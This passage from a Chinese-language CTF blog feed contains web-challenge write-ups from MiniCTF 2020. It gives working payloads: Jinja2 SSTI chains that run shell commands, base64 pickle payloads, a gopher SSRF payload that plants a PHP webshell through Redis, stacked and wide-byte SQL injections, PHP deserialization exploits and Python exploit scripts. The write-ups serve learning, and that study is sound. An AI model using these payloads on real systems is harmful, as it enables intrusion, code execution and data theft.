src="https://camo.githubusercontent.com/cea03f13f57dfd7fa0ef7f0085a808e184a6cd38fcc82cb62b7415ac75e92562/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35326133373537366536373938323535326565383666306534366433663234662e706e67"></p><p>并且可以看到前面的输入回显到了页面上，猜测是SSTI 输入<code>&#123;&#123;3*3&#125;&#125;</code>成功回显9 这里我做题时没来及的写脚本，所以是直接输入payload，抓包，改包认证vip身份来做题的 paylaod: <strong>查目录</strong> <code>gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==</code> <strong>查flag</strong> <code>gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu</code></p><p><img src="https://camo.githubusercontent.com/0819fd5ce56fd3c39735f814e73c9febc65cf87120f4337880cb7b92021bd606/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f64366433626363643132363539666163316338616132336261636137626136332e706e67"></p><p><img src="https://camo.githubusercontent.com/a094728e835a53600c499230e9d79adc9aeabc0b9c3ac5e328dbe2897dfdd44d/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f66363762343263616462393535623532373838356237636533396138333765352e706e67"></p><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><p>看题目名字大概可以确定这是一道模板注入的题目 经过简单的测试，可能是通过JS过滤了<code>&#39;&#123;&#39;&#39;&#125;&#39;&#39;%&#39;</code>,想到调试一下题目JS代码，看看能否去掉过滤(这里稍稍与lt师傅出题时候的想法不一样，相当于走了个小捷径)， 进入到JS的源码部分，直接搜索<code>&#123;</code>找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下submit函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用alert()结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。 没有JS的过滤了，那么就可以进行模板注入了,首先常规的<code>&#123;&#123;3*3&#125;&#125;</code>得到回显9，应该是jinja2的模板注入 经过简单的测试，过滤了<code>&#39;class&#39;,&#39;base&#39;,&#39;subclasses&#39;,&#39;init&#39;,&#39;flag&#39;,&#39;os&#39;,&#39;.&#39;,&#39;+&#39;,&#39;|&#39;,单引号</code> 这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的<code>&quot;&quot;.__class__.__base__.__subclasses__()</code>链条去执行命令，jinja2有个特性，<code>&quot;&quot;[&quot;__class__&quot;]==&quot;&quot;.__class__</code>，基于此，可以通过”进行字符拼接，利用这个特性绕过.以及关键词的过滤 一开始想着用这个链条<code> x[&quot;__init__&quot;][&quot;__globals__&quot;][&quot;__getitem__&quot;](&quot;__builtins__&quot;)</code>去调用命令执行模块,后来发现想的太简单了,可能由于python版本等诸多原因,这个payload在服务器端是打不通的 之后想通过遍历找到可以执行命令的模块,写了这个payload:<code>&#123;% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %&#125; &#123;% if c["__na""me__"] == "catch_warnings" %&#125; &#123;&#123;c["__in"it__"]["__getitem__"]["__globals__"]["__builtins__"]["eval"]("__import__(\"o\"\"s\")[\"system\"](\"ls /\")") &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code>但是可能由于相同的原因,这个payload也打不通 最后没办法只好通过手撕去查找,题目能利用的模块,我是用这个链条完全的手撕…(主要是最开始做题目虽然走了捷径,但也把思路禁锢在了直接在输入框中进行注入,没有想到抓包,写脚本跑一下)<code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[0]&#125;&#125;</code>最后得到</p><p><img src="https://camo.githubusercontent.com/3a16259342452d62bf8551c04b7536bcbd8c01fc69517409baadf05f7188836a/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f39346633343238386433386461633339303031363733663532643539623634622e706e67"></p><p>找到了可以执行命令的模块就什么都好说了 最终payload: <code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("ls /")["read"]()&#125;&#125;</code></p><p><img src="https://camo.githubusercontent.com/95edf11f5500aebdce1ca7858d39bddb58fb23887fd238f0bfdceb1d0c1c7bc5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61363062373436393330376134643330356331616535396537393735346665362e706e67"></p><p><code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /f*")["read"]()&#125;&#125;</code></p><h2 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h2><p>题目打开，是一个提示可以输入URL的框，猜测考察SSRF 进行简单的手动测试，得到过滤了<code>file://</code>,<code>dict</code>,<code>localhost</code>,<code>../</code> <code>file://</code>被过滤了，可以尝试<code>file:/</code>去绕过 POST传参，<code>url=file:/var/www/html/index.php</code> 得到了页面的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, <span class="variable">$url</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;这样子可不行哦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;minisecret&#x27;</span>]))&#123;</span><br><span class="line">system(<span class="string">&#x27;ifconfig eth1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST，minisecret会执行<code>ifconfig eth1</code>，让我们查看到相应的网卡信息</p><p> <a href="https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67"><img src="https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67" alt="img"></a></p><p>由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是172.192.97.3 <a href="https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67"><img src="https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67" alt="img"></a> </p><p>由于gopher协议是没有被过滤的，可以首先测试一下3306(mysql)以及6379(redis)是否开启服务，得到redis是有服务的 那么解决办法就是利用gopher协议去打redis，最终得到flag 起初想写入Webshell，然后用工具去连接，但这是不行的，已知的ip应该是一个内网ip，无法通过蚁剑等从外部连接 所以就想能否直接在shell中通过执行命令把flag查出来并回显 运行生成payload的工具<code>gopherus</code>,写入<code>&lt;?php system(&#39;cat /f*&#39;); ?&gt;</code>(这里基于前几题的flag位置进行了一点猜测) </p><p>payload：<code>url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code> </p><p>再利用SSRF访问172.192.97.3/shell.php，成功得到回显</p><p> <a href="https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67"><img src="https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67" alt="img"></a></p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;好白给的签到题&quot;&gt;&lt;a href=&quot;#好白给的签到题&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MiniCTF_2020</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/1732563798.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/1732563798.html</id>
    <published>2021-07-29T09:43:46.000Z</published>
    <updated>2022-12-13T12:45:10.658Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf.xidian.edu.cn/challenges">平台</a>上只有web的题目，只写了web。比赛的时候应该还有其他的。</p><p><a href="https://github.com/XDSEC/moeCTF_2020/tree/main/Misc">西电的信息安全协会里有题目</a>，<del>什么时候复现一下</del></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h3><p>好像根据BUUCTF的那个随便注改的吧？之前我也写过那个题的wp. 但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名miniL，没跑出来表名,这个就是用二分法不断的尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150#</span><br></pre></td></tr></table></figure><p>后来想起来应该是堆叠注入，得到了俩表user和1145141919810，查看下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `user`;</span><br><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `1145141919810`;</span><br></pre></td></tr></table></figure><p>然后查看列在1145141919810中看到了content（flag也应该在这里） 在mysql中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。<br>在sql中我们运用如下语句预编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=CONCAT(&#x27;sele&#x27;,&#x27;ct content from `1145141919810`&#x27;);</span><br><span class="line">prepare payload from @sql;</span><br><span class="line">execute payload;</span><br><span class="line">deallocate prepare payload;</span><br></pre></td></tr></table></figure><p>做到最后一个hint：strstr（）是提示我们大小写的，多试着改几次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT(&#x27;sele&#x27;,&#x27;ct content From `1145141919810`&#x27;); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#</span><br></pre></td></tr></table></figure><p>然后就可以拿到flag了（发现怎么还有个假的？？？emmmm）</p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>发现将cookie两部处理后传入file，将cookie里的gitbase64decode一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>改成<code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;classes.php&quot;;&#125;</code></p><p>最后的__wakeup魔术方法可以用php反序列化的CVE-2016-7124绕过。看github，是要传参cmd执行，但是过滤了一大堆东西，发现preg_match里唯独保留了P，此题题目也是P，想到看过的一篇文章，利用执行上传的临时文件tmp/phpXXXXXX，原文地址<a href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:3:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span><span class="comment">#反引号不输出，用&lt;?=代替&lt;?php echo输出</span></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;#!/bin/sh\ncat /* | grep minil&#x27;</span>&#125;</span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br></pre></td></tr></table></figure><h3 id="签-到-题"><a href="#签-到-题" class="headerlink" title="签 到 题"></a>签 到 题</h3><p>ls /看到了flag 和readflag，然后看了可用的bash，有sh和ash，不知道ash有什么用，</p><p>/readflag返回<code>do you want the flag?</code> ，后来🐧说frk喜欢考察linux，或许是交互回复一个yes?找了一下可以交互的函数，找到了<strong>proc_open</strong>，查了下函数的用法，一开始用Yes没用，试了下y有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下exp，核心是<code>y\ny\n120\n</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url += <span class="string">&#x27;?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;minil&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)<span class="comment">#不用延时的话一直都是docker准备状态 ):</span></span><br></pre></td></tr></table></figure><p>// Frank注: 你们为什么都这么喜欢暴力啊啊啊啊啊 怪我心软了给你们模了100</p><h3 id="are-you-reclu3e-Author-blackwatch"><a href="#are-you-reclu3e-Author-blackwatch" class="headerlink" title="are you reclu3e?| Author: blackwatch"></a>are you reclu3e?| Author: blackwatch</h3><p>扫出来了 .index.php.swp .login.php.swp</p><p>vim -r 还原</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;connection.php&quot;</span>;</span><br><span class="line">    mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SET CHARACTER SET &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span>=addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span>=addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&#x27;please post your username&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span>=<span class="string">&#x27;you are not reclu3e&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]!==<span class="variable">$password</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span>=<span class="string">&#x27;I know you are reclu3e but you need post the right password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Yes! you are reclu3e&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$msg</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">$msg</span>&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;close();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;window.location.href=&#x27;index.php&#x27;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/script&gt;&quot;</span>;  </span><br><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;<span class="comment">//$flag=&quot;minilctf&#123;****&#125;&quot;;</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;loginForm.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, reclu3e!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$p</span>=unserialize(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$height</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$serialize</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric(<span class="keyword">$this</span>-&gt;serialize))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;serialize++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&#x27;$s=&quot;&#x27;</span>.<span class="keyword">$this</span>-&gt;serialize.<span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login逻辑是判断输入的密码和取出的usr对应的密码比较，插表，GBK+addslashes 宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=reclu3e%df%27%20union%20select%201,2%23&amp;password=2</span><br></pre></td></tr></table></figure><p>php反序列化漏洞，private变量名前后要用%00</p><p><code>@eval(&#39;$s=&quot;&#39;.$this-&gt;serialize.&#39;&quot;;&#39;);</code>用”;闭合前后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?p= O:6:&quot;person&quot;:5:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:6:&quot;weight&quot;;i:0;s:6:&quot;height&quot;;i:0;s:17:&quot;%00person%00serialize&quot;;s:30:&quot;&quot;;high</span><br></pre></td></tr></table></figure><h2 id="IP-echo-service"><a href="#IP-echo-service" class="headerlink" title="IP echo service"></a>IP echo service</h2><p>本题考点为<a href="https://xz.aliyun.com/t/3679#toc-1">ssti注入</a>，而且过滤了双下划线<code>__</code>，百度过滤后的注入方法，先构造get请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><p>再伪造ip利用ssti漏洞进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p><a href="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67"><img src="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67" alt="image-20200509183253437"></a></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>过滤逗号等号的无列名注入，PHP反序列化字符逃逸</p><p>注入做的非预期：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logname=1&quot;||1 limit 1 offset 3#&amp;logpass=1</span><br></pre></td></tr></table></figure><p>得到<code>alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)</code>，访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = 